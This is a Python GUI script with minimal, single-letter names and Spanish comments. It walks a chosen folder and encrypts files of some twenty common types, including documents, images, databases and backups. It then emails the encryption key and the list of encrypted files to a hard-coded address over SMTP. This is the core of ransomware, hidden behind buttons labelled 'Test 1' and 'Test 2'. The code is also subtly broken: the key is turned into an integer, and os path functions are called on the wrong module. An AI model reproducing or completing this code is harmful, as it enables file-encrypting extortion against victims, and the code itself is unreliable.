import tkinter as a, smtplib as b, os as c
from tkinter import messagebox as d, filedialog as e
from cryptography.fernet import Fernet as f
from email.mime.multipart import MIMEMultipart as g
from email.mime.text import MIMEText as h
from PIL import Image as i, ImageTk as j

def k():
    key = int("".join(map(str, f.generate_key())))
    return key

def l(key, input_file, output_file):
    with open(input_file, 'rb') as file:
        data = file.read()

    cipher_suite = f(key)
    encrypted_data = cipher_suite.encrypt(data)

    with open(output_file, 'wb') as file:
        file.write(encrypted_data)

def m(sender_email, sender_password, receiver_email, key, encrypted_files):
    message = g()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = 'Clave de encriptación y lista de archivos encriptados'

    # Crear el cuerpo del correo con la clave y la lista de archivos encriptados
    encrypted_files = ''.join(map(str, encrypted_files))
    body = f"Guarda esta clave segura para descifrar el archivo:\n\n{str(key)}\n\nLista de archivos encriptados:\n{encrypted_files}"
    message.attach(h(body, 'plain'))

    # Enviar el correo electrónico
    with b.SMTP('smtp.example.com', 587) as server:  # Reemplaza con los detalles del servidor SMTP que desees utilizar
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, message.as_string())

def n():
    folder_path = e.askdirectory()
    if folder_path:
        key = k()
        extensions_to_encrypt = [".txt", ".docx", ".pdf", ".doc", ".xls", ".xlsx", ".ppt", ".pptx", ".jpg", ".jpeg", ".png", ".csv", ".mp3", ".mp4", ".avi", ".zip", ".rar", ".sql", ".db", ".bak"] # Agrega aquí las extensiones que deseas encriptar

        encrypted_files = []

        for root, dirs, files in c.walk(folder_path):
            for file in files:
                _, ext = c.splitext(file)
                if ext in extensions_to_encrypt:
                    input_file = c.join(root, file)
                    encrypted_file = input_file + ".encrypted"
                    l(key, input_file, encrypted_file)
                    encrypted_files.append(file)

        d.showinfo("Encriptación Exitosa", "Los archivos se han encriptado correctamente.")

        # Enviar la clave y la lista de archivos encriptados por correo electrónico
        sender_email = "test@test.com"
        sender_password = "tu_contraseña"
        receiver_email = "destinatario@test.com"
        m(sender_email, sender_password, receiver_email, key, encrypted_files)

def o():
    files = c.listdir()
    encrypted_files = [file for file in files if file.endswith(".encrypted")]
    if encrypted_files:
        d.showinfo("Archivos Encriptados", "Archivos encriptados encontrados:\n" + "\n".join(encrypted_files))
    else:
        d.showinfo("Archivos Encriptados", "No se encontraron archivos encriptados.")

if __name__ == "__main__":
    p = a.Tk()
    p.title("Encriptador con Menú")
    p.geometry("800x600")

    # Cargar imagen de fondo
    try:
        bg_image = i.open("ruta_de_la_imagen_de_fondo.png")  # Reemplaza con la ruta de tu imagen de fondo
        bg_image = bg_image.resize((800, 600))  # Ajustar al tamaño de la ventana
        bg_image = j.PhotoImage(bg_image)
        bg_label = a.Label(p, image=bg_image)
        bg_label.place(x=0, y=0, relwidth=1, relheight=1)
    except Exception as q:
        d.showerror("Error al cargar la imagen de fondo", str(q))

    # Botones
    test1_button = a.Button(p, text="Test 1", command=n)
    test1_button.pack(pady=10)

    test2_button = a.Button(p, text="Test 2", command=o)
    test2_button.pack(pady=10)

    p.mainloop()